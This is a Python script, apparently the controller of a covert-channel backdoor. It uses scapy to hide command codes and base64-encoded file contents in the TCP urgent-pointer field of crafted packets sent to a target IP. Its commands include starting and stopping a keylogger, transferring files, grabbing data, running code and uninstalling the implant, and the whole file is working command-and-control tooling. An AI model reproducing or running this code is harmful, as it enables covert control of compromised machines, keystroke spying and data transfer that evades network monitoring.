from scapy.all import IP, TCP, send
import socket
import sys
import base64
import os
import threading
import time

def validate_ip(ip):
    """Validate the given IP address."""
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

def send_packet(dest_ip, source_port, dest_port, urgent_pointer, seq_num, ack_num):
    """Send a TCP packet with the given parameters."""
    ip = IP(dst=dest_ip)
    tcp = TCP(sport=source_port, dport=dest_port, flags="PAU", urgptr=urgent_pointer, seq=seq_num, ack=ack_num)
    packet = ip/tcp

    send(packet)

def send_signal(dest_ip, source_port, dest_port, signal):
    """Send a signal to the destination."""
    seq_num = 1000  # Starting sequence number
    ack_num = 0  # Starting acknowledgment number

    # Ensure identifier fits in 16 bits
    signal_map = {
        "KL_START": 0x01,
        "KL_STOP": 0x02,
        "FT": 0x03,
        "WT_START": 0x04,
        "WT_STOP": 0x05,
        "GRAB": 0x06,
        "RUN": 0x07,
        "CLOSE": 0x08,
        "UNINSTALL": 0x09,
    }

    if signal not in signal_map:
        print("Error: Invalid signal.")
        exit(1)

    identifier = signal_map[signal]

    # Send the identifier as the first packet
    send_packet(dest_ip, source_port, dest_port, identifier, seq_num, ack_num)
    seq_num += 1
    ack_num += 1

    print(f"Signal {signal} sent with identifier {identifier}.")

def send_data(dest_ip, source_port, dest_port, file_path, is_file):
    """Send a file or data to the destination."""
    if is_file:
        file_name = file_path
        metadata = f"{file_name}|"
        with open(file_path, 'rb') as file:
            file_content = file.read().decode()  # Read the file content and decode it to string
    else:
        metadata = ""
        file_content = file_path
    data = metadata + file_content
    encoded_data = base64.b64encode(data.encode()).decode()  # Encode the entire data in base64

    print(f"Encoded Data: {encoded_data}")  # Debugging statement
    print(f"Decoded Data: {base64.b64decode(encoded_data.encode()).decode()}")  # Debugging statement

    seq_num = 1000  # Starting sequence number
    ack_num = 0  # Starting acknowledgment number
    chunk_size = 2  # Size of each chunk to send (16-bit max value is 65535, which is 2 bytes)
    eof_signal = 65535

    for i in range(0, len(encoded_data), chunk_size):
        urgent_pointer_chunk = encoded_data[i:i+chunk_size]
        urgent_pointer_value = int.from_bytes(urgent_pointer_chunk.encode(), 'big')
        if urgent_pointer_value > 65535:
            urgent_pointer_value = 65535
        send_packet(dest_ip, source_port, dest_port, urgent_pointer_value, seq_num, ack_num)
        seq_num += 1  # Increment sequence number for each packet
        ack_num += 1  # Increment acknowledgment number for each packet

    send_packet(dest_ip, source_port, dest_port, eof_signal, seq_num, ack_num)  # Send EOF signal
    print("EOF signal and data sent.")
    sys.exit(0)

def run_async_task(task):
    """Run a task asynchronously."""
    threading.Thread(target=task).start()

if __name__ == "__main__":
    if len(sys.argv) < 2 or len(sys.argv) > 3:
        print("Usage: python3 encoder.py <signal:ip> [<file_path>]")
        exit(1)

    signal_ip = sys.argv[1]
    file_path = sys.argv[2] if len(sys.argv) == 3 else None

    try:
        signal, dest_ip = signal_ip.split(":")
    except ValueError:
        print("Error: Invalid format. Use <signal:ip>.")
        exit(1)

    if not validate_ip(dest_ip):
        print("Error: Invalid destination IP address.")
        exit(1)

    source_port = 80
    dest_port = 80

    if signal == "FT" and file_path:
        try:
            if not os.path.isfile(file_path):
                raise FileNotFoundError("The specified file does not exist.")
        except FileNotFoundError as e:
            print(f"Error: {e}")
            exit(1)
        run_async_task(lambda: send_signal(dest_ip, source_port, dest_port, signal))
        time.sleep(2)
        run_async_task(lambda: send_data(dest_ip, source_port, dest_port, file_path, True))
    elif signal == "WT_START" and file_path:
        run_async_task(lambda: send_signal(dest_ip, source_port, dest_port, signal))
        time.sleep(2)
        run_async_task(lambda: send_data(dest_ip, source_port, dest_port, file_path, False))
    else:
        run_async_task(lambda: send_signal(dest_ip, source_port, dest_port, signal))
